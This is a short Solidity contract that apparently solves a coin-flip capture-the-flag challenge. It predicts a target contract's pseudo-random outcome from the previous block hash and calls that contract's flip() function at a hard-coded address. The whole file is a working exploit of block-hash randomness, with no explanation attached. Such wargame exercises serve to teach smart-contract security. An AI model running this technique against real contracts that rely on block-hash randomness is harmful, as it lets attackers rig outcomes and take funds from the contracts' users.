pragma solidity 0.4.24;

interface Test {
    function flip(bool _guess) external returns (bool);
}

contract Sina {
    Test instance;
    bool public side;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        instance = Test(0x53295F7695d07B109dEc7db40cf8B35E22bF66c9);
    }

    function decide() public {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 number = uint256(uint(blockValue)/FACTOR);
        side = number == 1 ? true : false;

        instance.flip(side);
    }

}
